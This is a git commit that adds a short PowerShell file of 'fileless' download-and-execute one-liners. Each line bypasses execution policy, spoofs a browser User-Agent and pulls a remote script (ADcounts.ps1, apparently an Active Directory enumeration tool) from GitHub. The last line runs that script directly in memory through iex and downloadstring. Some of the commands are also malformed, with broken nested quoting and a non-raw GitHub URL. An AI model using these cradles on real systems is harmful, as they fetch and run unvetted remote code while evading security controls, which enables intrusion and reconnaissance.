4f3fd100f78ac29161c2c35805e82e145f1d9324
OnlyTheShadowKnows <68879244+OnlyTheShadowKnows@users.noreply.github.com>
2020-07-28 16:51:24 -0400

    Create filelessadcount.ps1

---
+++ filelessadcount.ps1
@@ -0,0 +1,13 @@
+powershell -exec bypass -command {
+    $cli = New-Object System.Net.WebClient;
+    $cli.Headers['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.45"
+    $cli.DownloadFile('https://github.com/OnlyTheShadowKnows/AD/blob/master/ADcounts.ps1', 'C:\file.name')
+}
+
+powershell -command "invoke-expression (
+$cli = New-Object System.Net.WebClient; 
+$cli.Headers['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.45"; 
+$cli.DownloadFile('https://github.com/OnlyTheShadowKnows/AD/blob/master/ADcounts.ps1', 'C:\file.name') )"
+
+# And then 
+powershell -nop -c "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/OnlyTheShadowKnows/AD/master/ADcounts.ps1')"
